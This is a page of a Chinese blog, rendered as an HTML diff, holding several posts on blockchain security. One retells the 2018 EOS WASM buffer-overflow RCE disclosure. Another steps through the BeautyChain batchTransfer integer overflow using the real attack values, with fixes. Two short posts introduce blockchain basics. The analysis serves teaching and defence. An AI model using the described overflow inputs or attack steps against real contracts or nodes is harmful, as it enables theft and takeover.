@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Jean’s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="My blogs">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Jean’s Blog">
+<meta property="og:url" content="http://www.yi-diandian.com/page/4/index.html">
+<meta property="og:site_name" content="Jean’s Blog">
+<meta property="og:description" content="My blogs">
+<meta property="article:author" content="Jean">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Jean’s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Jean’s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">你真正是谁并不重要，重要的是你的所作所为。</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://www.yi-diandian.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-btc4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/btc4/" class="article-date">
+  <time datetime="2020-04-06T02:28:14.232Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/btc4/">EOS节点远程代码执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>5月29日，360安全研究团队发现了EOS区块链系统的一个越界写缓冲区溢出漏洞，通过该漏洞可直接在节点服务器执行任意代码并完全控制服务器。</p>
+<h1 id="EOS简介"><a href="#EOS简介" class="headerlink" title="EOS简介"></a>EOS简介</h1><p>既然是EOS区块链系统的漏洞，那我们简单了解一下，什么是EOS？</p>
+<p>EOS: Enterprise Operation System，即为商用分布式应用设计的一款区块链操作系统。</p>
+<p>EOS是引入的一种新的区块链架构，旨在实现分布式应用的性能扩展。</p>
+<p>注意，它并不是像比特币和以太坊那样的货币，而是基于EOS软件项目之上发布的代币，被称为区块链3.0。（百度百科）</p>
+<p>更详细的信息可以访问EOS官网地址<a href="https://eos.io/" target="_blank" rel="noopener">https://eos.io/</a> 查看。<br>EOS GitHub地址：<a href="https://github.com/EOSIO/eos" target="_blank" rel="noopener">https://github.com/EOSIO/eos</a><br><img src="https://imgsrc.baidu.com/baike/pic/item/838ba61ea8d3fd1f55fb04ae3c4e251f94ca5fb7.jpg" alt></p>
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>EOS区块链系统在解析智能合约WASM文件时，产生了一个越界写缓冲区溢出漏洞。</p>
+<p>通过该漏洞，攻击者可以上传恶意的智能合约代码到节点服务器，然后当节点服务器解析恶意的智能合约时</p>
+<p>攻击者就能够在节点上执行任意代码并完全控制节点服务器。</p>
+<p>攻击者控制节点服务器后，攻击者可以将恶意智能合约打包进新的区块，而其他新的节点会同步区块内容，导致可攻击和控制其他新的节点，最终攻击和控制整个EOS区块链网络。</p>
+<h1 id="漏洞时间线"><a href="#漏洞时间线" class="headerlink" title="漏洞时间线"></a>漏洞时间线</h1><p>2018/5/11———-发现EOS越界写缓冲区溢出漏洞<br>2018/5/28———-调试并成功开发出完整攻破EOS超级节点的漏洞验证代码<br>2018/5/28———-将漏洞细节报告给EOS官方<br>2018/5/29———-EOS官方在GitHub托管代码库中修复该漏洞，并关闭了问题跟踪<br>2018/5/29———-提醒EOS官方，漏洞未完全修复<br>2018/5/30———-官方已修复漏洞<br>以下是360安全人员和官方沟通的一些细节：<br><img src="http://blogs.360.cn/wp-content/uploads/2018/05/001.jpg" alt></p>
+<p>提供邮箱接收报告。</p>
+<p><img src="http://blogs.360.cn/wp-content/uploads/2018/05/002.jpg" alt></p>
+<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>漏洞存在于libraries/chain/webassembly/binaryen.cpp文件的78行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function binaryen_runtime::instantiate_module:</span><br><span class="line">for (auto&amp; segment : module-&gt;table.segments) </span><br><span class="line">&#123;</span><br><span class="line">	Address offset &#x3D; ConstantExpressionRunner&lt;TrivialGlobalManager&gt;(globals).visit(segment.offset).value.geti32();</span><br><span class="line">	assert(offset + segment.data.size() &lt;&#x3D; module-&gt;table.initial);</span><br><span class="line">	for (size_t i &#x3D; 0; i !&#x3D; segment.data.size(); ++i) </span><br><span class="line">	&#123;</span><br><span class="line">		table[offset + i] &#x3D; segment.data[i]; &lt;&#x3D; OOB write here !</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的table是一个std :: vector包含在函数表中的名称，在将元素存储到table中时，|offset| 字段没有被正确检查。</p>
+<p>注意在设置该值之前是有一个assert 断言的，它会检查偏移量，但不幸的是assert 仅适用于Debug版本，不适用于发布版本。</p>
+<p>table.resize(module-&gt;table.initial);|module-&gt;table.initial| 这个代码片段读取的值是根据函数表声明，在WASM文件中的读取时，该字段的有效值为0〜1024。</p>
+<p>|offset| 字段的值是根据数据段从WASM文件中读取的，它是一个带符号的32位值。</p>
+<p>所以通过这个漏洞，可以在table向量之后的内存，越界写入一定范围的内容。</p>
+<h1 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h1><p>利用该漏洞可以在nodeos进程中实现远程代码执行</p>
+<p>漏洞利用方法：<br>上传恶意智能合约代码到受害节点服务器<br>让节点服务器解析恶意智能合约<br>在真正的攻击中，攻击者可能会向EOS主网络发布恶意智能合约代码。</p>
+<p>EOS超级节点一单解析恶意智能合约触发漏洞，攻击者能够完全控制这个节点服务器。</p>
+<p>攻击者控制节点后，可进行的操作:</p>
+<ul>
+<li>窃取超级节点的私钥</li>
+<li>控制新区块的内容</li>
+<li>打包恶意智能合约到新的区块并发布然后攻击其他的节点</li>
+<li>导致整个网络汇总的所有节点受攻击并被控制</li>
+<li>360安全人员编写了概念性的漏洞验证程序，然后在64位Ubuntu系统上进行了演示。</li>
+</ul>
+<h1 id="具体攻击过程："><a href="#具体攻击过程：" class="headerlink" title="具体攻击过程："></a>具体攻击过程：</h1><ul>
+<li>攻击者将恶意智能合约上传到节点服务器</li>
+<li>节点服务器解析引发漏洞的恶意智能合约</li>
+<li>使用越界写入的代码，覆盖WASM模块实例的WASM内存缓冲区</li>
+<li>在恶意WASM代码的帮助下，成功实现了任意内存读/写操作</li>
+<li>可绕过常见的操作系统攻击缓解技术</li>
+<li>反弹shell给攻击者</li>
+</ul>
+<h1 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h1><p><a href="http://v.youku.com/v_show/id_XMzYzMTg1NjYwMA==.html" target="_blank" rel="noopener">http://v.youku.com/v_show/id_XMzYzMTg1NjYwMA==.html</a></p>
+<h1 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h1><p><a href="http://blogs.360.cn/blog/eos-node-remote-code-execution-vulnerability/" target="_blank" rel="noopener">http://blogs.360.cn/blog/eos-node-remote-code-execution-vulnerability/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/btc4/" data-id="ck8nvek8j0006d8h50q4sgvoi" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/EOS/" rel="tag">EOS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="tag">远程代码执行漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-btc3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/btc3/" class="article-date">
+  <time datetime="2020-04-06T02:28:14.230Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/btc3/">BeautyChain智能合约中的毁灭性漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="安全事件"><a href="#安全事件" class="headerlink" title="安全事件"></a>安全事件</h1><p>最近，智能合约漏洞很火。<br>让我们再来看一下4月22日BeautyChain（BEC）的智能合约中一个毁灭性的漏洞。</p>
+<p>*<em>BeautyChain团队宣布，BEC代币在4月22日出现异常。攻击者通过智能合约漏洞成功转账了10^58 BEC到两个指定的地址。<br>*</em><br>具体交易详情<a href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f" target="_blank" rel="noopener">https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f</a></p>
+<p>攻击者到底是怎么攻击的？为什么能转账这么大的BEC？</p>
+<h1 id="智能合约代码"><a href="#智能合约代码" class="headerlink" title="智能合约代码"></a>智能合约代码</h1><p>首先我们来看BEC转账的智能合约代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) &#123;</span><br><span class="line">    uint cnt &#x3D; _receivers.length;</span><br><span class="line">    uint256 amount &#x3D; uint256(cnt) * _value;</span><br><span class="line">    require(cnt &gt; 0 &amp;&amp; cnt &lt;&#x3D; 20);</span><br><span class="line">    require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender].sub(amount);</span><br><span class="line">    for (uint i &#x3D; 0; i &lt; cnt; i++) &#123;</span><br><span class="line">        balances[_receivers[i]] &#x3D; balances[_receivers[i]].add(_value);</span><br><span class="line">        Transfer(msg.sender, _receivers[i], _value);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>以上的代码是Solidity语言，是一门面向合约的，为实现智能合约而创建的高级编程语言。</p>
+<h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>在读代码之前我们先来简单了解一下以下几个变量类型(Solidity):</p>
+<p>address<br>160位的值，且不允许任何算数操作。</p>
+<p>uint 8<br>8位无符号整数，范围是0到2^8减1 (0-255)</p>
+<p>uint256<br>256位无符号整数，范围是0到2^256减1<br>(0-115792089237316195423570985008687907853269984665640564039457584007913129639935)</p>
+<p>敲黑板，玩手机的同学注意看这里，这里是考试重点哦<br>那么，我们请看如下神奇的化学反应</p>
+<h2 id="定义变量uint-a"><a href="#定义变量uint-a" class="headerlink" title="定义变量uint a"></a>定义变量uint a</h2><p>a的取值范围是0到255</p>
+<p>当a=255，我们对a加 1，a会变成 0。<br>当a=255，我们对a加 2，a会变成 1。<br>当a=0，我们对a减 1，a会变成 255。<br>当a=0，我们对a减 2，a会变成 254。</p>
+<p>a的值超过了它实际的取值范围，然后会得出后面的值，这种情况叫溢出。</p>
+<h2 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h2><p>知道了这几个变量类型，下面我们一行一行的来读这段代码。</p>
+<h3 id="第一行"><a href="#第一行" class="headerlink" title="第一行"></a>第一行</h3><p>function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool)</p>
+<p>==函数有两个参数:==</p>
+<p>_receivers ———-转账接收人，address类型的变量数组，是一个160位的值。<br>_value —————转账数量，uint256的状态变量，256位的无符号整数。<br>定义函数batchTransfer，功能主要是实现转账，接收两个参数，定义了参数的取值范围。</p>
+<h3 id="第二行"><a href="#第二行" class="headerlink" title="第二行"></a>第二行</h3><p>uint cnt = _receivers.length;</p>
+<p>计算接收人地址对应地址数组的长度，即转账给多少人。</p>
+<h3 id="第三行"><a href="#第三行" class="headerlink" title="第三行"></a>第三行</h3><p>uint256 amount = uint256(cnt) * _value;</p>
+<p>把unit类型的cnt参数值强制转换为uint256然后乘以转账数量_value 并赋值给uint256类型的amount变量。</p>
+<h3 id="第四行"><a href="#第四行" class="headerlink" title="第四行"></a>第四行</h3><p>require(cnt &gt; 0 &amp;&amp; cnt &lt;= 20);</p>
+<p>require函数</p>
+<p>require的入参判定为 false，则终止函数，恢复所有对状态和以太币账户的变动，并且也不会消耗 gas 。</p>
+<p>判断cnt是否大于0且cnt是否小于等于20</p>
+<h3 id="第五行"><a href="#第五行" class="headerlink" title="第五行"></a>第五行</h3><p>require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);</p>
+<p>==参数解读:==</p>
+<p>_value————————–转账数量<br>balances[msg.sender]———转账人余额<br>amount————————转账总数量<br>判断_value是否大于0且转账人的余额balances[msg.sender]大于等于转账总金额amount</p>
+<h3 id="第六行"><a href="#第六行" class="headerlink" title="第六行"></a>第六行</h3><p>balances[msg.sender] = balances[msg.sender].sub(amount);</p>
+<p>计算转账人的余额，使用当前余额balances[msg.sender]减去转账总数量</p>
+<h3 id="第七行"><a href="#第七行" class="headerlink" title="第七行"></a>第七行</h3><p>for (uint i = 0; i &lt; cnt; i++) {</p>
+<p>这里是一个循环，循环次数为cnt（遍历转账地址）</p>
+<h3 id="第八行"><a href="#第八行" class="headerlink" title="第八行"></a>第八行</h3><p>balances[_receivers[i]] = balances[_receivers[i]].add(_value);</p>
+<p>当i有具体的值时，balances[_receivers[i]]表示转账接收人，这里是表示转账人给转账接收人_value数量的币。</p>
+<h3 id="第九行"><a href="#第九行" class="headerlink" title="第九行"></a>第九行</h3><p>Transfer(msg.sender, _receivers[i], _value);</p>
+<p>保存转账记录</p>
+<h3 id="第十行"><a href="#第十行" class="headerlink" title="第十行"></a>第十行</h3><p>return true;</p>
+<p>函数返回为True</p>
+<h2 id="代码流程"><a href="#代码流程" class="headerlink" title="代码流程"></a>代码流程</h2><p>OK，我们读了完整的代码，接下来请看一个流程图</p>
+<p><img src="https://s1.ax1x.com/2018/05/28/C4tumq.png" alt></p>
+<p>函数的流程是这样，那么攻击者到底是怎么攻击的呢？他为什么这么秀？同样都是九年义务教育……</p>
+<p>攻击过程<br>其实，他只是细心了一点，所使用的攻击方法并不高明啊，你且听我慢慢道来，注意看，别走神啊。</p>
+<p>交易详情<br>我们首先看这笔详细的交易：<br><img src="https://s1.ax1x.com/2018/05/28/C4tJ1J.png" alt></p>
+<h4 id="好了，我们从图可以看到"><a href="#好了，我们从图可以看到" class="headerlink" title="好了，我们从图可以看到"></a>好了，我们从图可以看到</h4><p>转账接收人有两个地址，即balances[_receivers]:</p>
+<p>000000000000000000000000b4d30cac5124b46c2df0cf3e3e1be05f42119033<br>0000000000000000000000000e823ffe018727585eaf5bc769fa80472f76c3d7</p>
+<p>转账数量为_value:</p>
+<p>8000000000000000000000000000000000000000000000000000000000000000（十六进制）</p>
+<p>转10进制为</p>
+<p>57896044618658097711785492504343953926634992332820282019728792003956564819968</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>OK，接下来我们来走函数流程</p>
+<h3 id="第一行-1"><a href="#第一行-1" class="headerlink" title="第一行"></a>第一行</h3><p>function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool)</p>
+<p>正常执行</p>
+<h3 id="第二行-1"><a href="#第二行-1" class="headerlink" title="第二行"></a>第二行</h3><p>uint cnt = _receivers.length<br>由于这里有两个转账接收人地址，address数组长度为2，所以cnt为2，类型为uint</p>
+<h3 id="第三行-1"><a href="#第三行-1" class="headerlink" title="第三行"></a>第三行</h3><p>uint256 amount = uint256(cnt) * _value;</p>
+<p>_value=57896044618658097711785492504343953926634992332820282019728792003956564819968<br>cnt=2<br>两者相乘得到amount，类型为uint256<br><img src="https://s1.ax1x.com/2018/05/28/C4NSCF.png" alt></p>
+<p>即amount=115792089237316195423570985008687907853269984665640564039457584007913129639936</p>
+<p>考试重点用上了，记不住的同学去前面看看。</p>
+<p>amount的类型为uint256，那么按照理论，它的最大取值是0到2^256减1，即</p>
+<p>115792089237316195423570985008687907853269984665640564039457584007913129639935</p>
+<p>所以！！！<br>amount瞬间从115792089237316195423570985008687907853269984665640564039457584007913129639936变成了0<br>第三行得到的结果：amount=0</p>
+<h3 id="第四行-1"><a href="#第四行-1" class="headerlink" title="第四行"></a>第四行</h3><p>require(cnt &gt; 0 &amp;&amp; cnt &lt;= 20);</p>
+<p>cnt=2，2肯定大于0，2当然也小于等于20<br><strong>所以这个条件成立，require函数返回值为True。</strong></p>
+<h3 id="第五行-1"><a href="#第五行-1" class="headerlink" title="第五行"></a>第五行</h3><p>require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);</p>
+<p>_value=57896044618658097711785492504343953926634992332820282019728792003956564819968</p>
+<p>_value肯定是大于0，转账人的余额balances[msg.sender]肯定是大于等于0的。<br><strong>所以这个条件同样成立，require函数返回值为True。</strong></p>
+<h3 id="第六行-1"><a href="#第六行-1" class="headerlink" title="第六行"></a>第六行</h3><p>balances[msg.sender] = balances[msg.sender].sub(amount);</p>
+<p>前面的条件都成立，那么代码会执行到这。</p>
+<p>这行代码是求转账人转完账以后剩下的余额，amount为0 ，<strong>那么转账人的余额其实没变！！！</strong></p>
+<h3 id="第七行-1"><a href="#第七行-1" class="headerlink" title="第七行"></a>第七行</h3><p>for (uint i = 0; i &lt; cnt; i++)</p>
+<p>cnt=2，该行代码表示执行两次后面的操作</p>
+<h3 id="第八行-1"><a href="#第八行-1" class="headerlink" title="第八行"></a>第八行</h3><p>balances[_receivers[i]] = balances[_receivers[i]].add(_value);<br>i=0时，转账接收人balances[_receivers[0]]的余额加_value<br>i=1时，转账接收人balances[_receivers[1]]的余额加_value</p>
+<p>看到这里其实我们就很明白了吧。</p>
+<p>攻击者给以下两个转账接收人</p>
+<p><strong>000000000000000000000000b4d30cac5124b46c2df0cf3e3e1be05f42119033<br>0000000000000000000000000e823ffe018727585eaf5bc769fa80472f76c3d7</strong></p>
+<p>转了<br>_value=57896044618658097711785492504343953926634992332820282019728792003956564819968个币</p>
+<p>更可恶的是，攻击者执行完这个操作，转账人的余额根本没变，看代码第六行的执行结果。</p>
+<h3 id="第九行-1"><a href="#第九行-1" class="headerlink" title="第九行"></a>第九行</h3><p>Transfer(msg.sender, _receivers[i], _value);<br>这里只是把上面两个转账记录保存。</p>
+<h3 id="第十行-1"><a href="#第十行-1" class="headerlink" title="第十行"></a>第十行</h3><p>return true;</p>
+<p>函数返回为True</p>
+<p>小结<br>千里之堤毁于蚁穴！<br>就一个溢出漏洞，导致BEC的市值瞬间变0</p>
+<p>这么傻的问题，写代码的人是写睡着了吗？？？</p>
+<p>不，其实他根本没睡着啊，人家还用了SafeMath里的add函数和sub函数</p>
+<p><img src="https://s1.ax1x.com/2018/05/28/C4UPJS.png" alt></p>
+<p>我们看看什么是SafeMath函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @title SafeMath</span><br><span class="line"> * @dev Math operations with safety checks that throw on error</span><br><span class="line"> *&#x2F;</span><br><span class="line">library SafeMath &#123;</span><br><span class="line">  function mul(uint256 a, uint256 b) internal constant returns (uint256) &#123;</span><br><span class="line">    uint256 c &#x3D; a * b;</span><br><span class="line">    assert(a &#x3D;&#x3D; 0 || c &#x2F; a &#x3D;&#x3D; b);</span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line">  function div(uint256 a, uint256 b) internal constant returns (uint256) &#123;</span><br><span class="line">    &#x2F;&#x2F; assert(b &gt; 0); &#x2F;&#x2F; Solidity automatically throws when dividing by 0</span><br><span class="line">    uint256 c &#x3D; a &#x2F; b;</span><br><span class="line">    &#x2F;&#x2F; assert(a &#x3D;&#x3D; b * c + a % b); &#x2F;&#x2F; There is no case in which this doesn&#39;t hold</span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sub(uint256 a, uint256 b) internal constant returns (uint256) &#123;</span><br><span class="line">    assert(b &lt;&#x3D; a);</span><br><span class="line">    return a - b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add(uint256 a, uint256 b) internal constant returns (uint256) &#123;</span><br><span class="line">    uint256 c &#x3D; a + b;</span><br><span class="line">    assert(c &gt;&#x3D; a);</span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意看这一段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function mul(uint256 a, uint256 b) internal constant returns (uint256) &#123;</span><br><span class="line">   uint256 c &#x3D; a * b;</span><br><span class="line">   assert(a &#x3D;&#x3D; 0 || c &#x2F; a &#x3D;&#x3D; b);</span><br><span class="line">   return c;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>这里是乘法计算，计算出乘法的结果后会用assert函数去验证结果是否正确。</p>
+<p><strong>回到我们前面的第三行代码执行后的结果</strong></p>
+<p>_value=57896044618658097711785492504343953926634992332820282019728792003956564819968<br>cnt=2</p>
+<p>两者相乘得到amount，类型为uint256</p>
+<p>由于溢出，amount=0</p>
+<p>赋值给mul函数即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;amount，而amount&#x3D;0，则c&#x3D;0</span><br><span class="line">a&#x3D;cnt, 而cnt&#x3D;2，则a&#x3D;2</span><br><span class="line">b&#x3D;_value</span><br><span class="line">得出</span><br><span class="line">b&#x3D;57896044618658097711785492504343953926634992332820282019728792003956564819968</span><br></pre></td></tr></table></figure>
+<p>那么c/a==b这个式子不成立，导致assert函数执行会报错，assert报错，那么就不会执行后面的代码，也就不会发生溢出。</p>
+<p><strong>也就是说，写这段代码的人，加减法他用了SafeMath里面的add函数和sub函数，但是却没有用里面的乘法函数mul</strong></p>
+<h1 id="如何防止这样的漏洞？"><a href="#如何防止这样的漏洞？" class="headerlink" title="如何防止这样的漏洞？"></a>如何防止这样的漏洞？</h1><ul>
+<li>肯定是要用SafeMath函数啊，你加减法用了，乘法不用，你咋这么皮呢</li>
+<li>代码上线前要做代码审计啊亲，强调多少遍了！</li>
+<li>合理使用变量类型，了解清楚变量的范围</li>
+<li>一定要考虑到溢出！一定要考虑到溢出！一定要考虑到溢出！重要的事情说三遍。</li>
+<li>写这么通俗易懂，你应该看懂了吧？？?</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/btc3/" data-id="ck8nvek8h0005d8h500o5gszj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="tag">智能合约</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-btc2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/btc2/" class="article-date">
+  <time datetime="2020-04-06T02:28:14.227Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/btc2/">区块链安全解决方案</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>谈及区块链安全，不应该仅仅局限于区块链本身，它的使用者及其衍生的东西都需要我们重点关注。<br><img src="https://s1.ax1x.com/2018/05/16/Cy9s0I.md.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/btc2/" data-id="ck8nvek8g0004d8h5a97sf9kh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-btc" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/btc/" class="article-date">
+  <time datetime="2020-04-06T02:28:14.217Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/btc/">区块链初识之比特币</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="比特币知识（一）"><a href="#比特币知识（一）" class="headerlink" title="比特币知识（一）"></a>比特币知识（一）</h1><p><a href="http://blog.yuccn.net/archives/64.html" target="_blank" rel="noopener">http://blog.yuccn.net/archives/64.html</a></p>
+<p>比特币：p2p形式的数字货币，网上虚拟货币的一种<br>比特币是一种总量恒定在2100万的数字货币，特点是“去中心化”、”全球流通” 、“匿名化” 等<br>严格来说，比特币不是一种货币，而是一个账本<br>更准确说是一个基于互联网分布式存储的一种帐本系统。</p>
+<p>比特币的中心思想是去中心化，或者多中心化，多个中心达成共识一起的记账</p>
+<p>比特币系统:哈希值计算的争夺</p>
+<h1 id="比特币知识（二）"><a href="#比特币知识（二）" class="headerlink" title="比特币知识（二）"></a>比特币知识（二）</h1><p><a href="http://blog.yuccn.net/archives/71.html" target="_blank" rel="noopener">http://blog.yuccn.net/archives/71.html</a></p>
+<p>故事中，最初的物物交换就是原始人最初的交易方式，使用石头交易是物物交易的进阶。再到部落居民使用三叔和山娃的存条进行交易，就是典型的中心化系统模式了，类似今天的银行。再到记账模式，参与记账的居民，就是现实中比特币的矿机（参与记账的电脑节点），每个矿机会保存着一份完整的帐本。</p>
